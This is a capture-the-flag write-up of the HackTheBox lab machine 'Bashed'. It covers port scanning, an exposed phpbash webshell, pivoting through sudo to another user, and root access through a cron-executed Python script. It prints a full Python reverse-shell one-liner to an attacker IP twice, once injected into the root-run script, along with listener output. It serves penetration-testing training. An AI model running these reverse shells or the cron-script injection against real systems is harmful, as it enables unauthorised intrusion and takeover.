---
permalink: /posts/HTB/Bashed
title:  "HTB Bashed"
author: Luc Kolen
description: "Bashed is an easy Linux machine on HTB"
categories:
  - CTF
  - HTB
tags:
  - HTB-Easy
  - Linux
  - Gobuster
  - Nikto
---
# 10.10.10.68 - Bashed

- [10.10.10.68 - Bashed](#10101068---bashed)
  - [Open ports](#open-ports)
  - [HTTP](#http)
  - [Privilege escalation](#privilege-escalation)
  - [TL;DR](#tldr)
  - [Bonus](#bonus)
    - [Why the privilege escalation worked](#why-the-privilege-escalation-worked)

## Open ports

```bash
luc@kali:~/HTB/Bashed$ nmap -vv --reason -Pn -A --osscan-guess --version-all -p- 10.10.10.68
```

|Port|Service|Version
|---|---|---|
80/tcp|http|Apache httpd 2.4.18 ((Ubuntu))

## HTTP

The website only has one post and it's about [phpbash](https://github.com/Arrexel/phpbash) and that it was developed on the webserver we're currently connecting to.

```bash
luc@kali:~/HTB/Bashed$ gobuster dir -u http://10.10.10.68 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
...
/dev (Status: 301)
...
luc@kali:~/HTB/Bashed$ nikto -url http://10.10.10.68
...
+ OSVDB-3268: /dev/: Directory indexing found.
...
```

Both Gobuster and Nikto found a `/dev` directory on the webserver. Browsing to this directory we can see `phpbash.min.php` and `phpbash.php`, this matches the post about it being developed on this machine. Opening `http://10.10.10.68/dev/phpbash.php` gives us a webshell.

```bash
www-data@bashed:/var/www/html/dev# id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@bashed:/var/www/html/dev# cd /home/arrexel
www-data@bashed:/home/arrexel# cat user.txt
2c281f31************************
```

We're running as `www-data` and we can read the `user.txt` file.

## Privilege escalation

```bash
www-data@bashed:/var/www/html/dev# sudo -l
Matching Defaults entries for www-data on bashed:
env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on bashed:
(scriptmanager : scriptmanager) NOPASSWD: ALL
```

We can run all commands as the `scriptmanager` user.

```bash
www-data@bashed:/# which python
/usr/bin/python
www-data@bashed:/# python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.16",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```

```bash
luc@kali:~/HTB/Bashed$ sudo nc -lnvp 443
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.68.
Ncat: Connection from 10.10.10.68:45786.
www-data@bashed:/$ sudo -u scriptmanager /bin/bash
scriptmanager@bashed:/$ id
uid=1001(scriptmanager) gid=1001(scriptmanager) groups=1001(scriptmanager)
```

We're able to run sudo now because we're in an interactive shell instead of the phpbash webshell.

```bash
scriptmanager@bashed:/$ ls -lsa
...
4 drwxrwxr--   2 scriptmanager scriptmanager  4096 Jun 17 12:13 scripts
...
scriptmanager@bashed:/$ ls scripts -lsa
...
4 -rw-r--r--  1 scriptmanager scriptmanager  283 Jun 17 11:59 test.py
4 -rw-r--r--  1 root          root            12 Jun 17 11:59 test.txt
...
scriptmanager@bashed:/scripts$ cat test.py
f = open("test.txt", "w")
f.write("testing 123!")
f.close
scriptmanager@bashed:/scripts$ cat test.txt
testing 123!
```

We can see that scriptmanager owns the `test.py` script, but that `test.txt` is owned by `root`. So we know that `root` has executed the script. Both files are created on the same date so there is a good chance that there is a crontab running as `root` that executes this file. We'll check this in [Bonus](#bonus).

```bash
scriptmanager@bashed:/scripts$ cat test.py
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.16",444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")

f = open("test.txt", "w")
f.write("testing 123!")
f.close
```

```bash
luc@kali:~/HTB/Bashed$ sudo nc -lnvp 444
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::444
Ncat: Listening on 0.0.0.0:444
Ncat: Connection from 10.10.10.68.
Ncat: Connection from 10.10.10.68:58562.
/bin/sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
# cat /root/root.txt
cc4f0afe************************
```

We add the same Python reverse shell we used earlier (but now on port 444) to the `test.py` file. This triggers a reverse shell as `root` a few seconds later.

## TL;DR

- `phpbash.php` was left on the webserver in the `dev` folder
- `www-root` can run as `scriptmanager`
- `scriptmanager` can edit/create scrips that `root` will execute

## Bonus

### Why the privilege escalation worked

```bash
# crontab -l
* * * * * cd /scripts; for f in *.py; do python "$f"; done
```

As root we can read the crontab to see what tasks are scheduled to run. We see that it goes over all `.py` files in `/scripts` and executes them. We could've also created another file instead of adding our code to the `test.py` file.
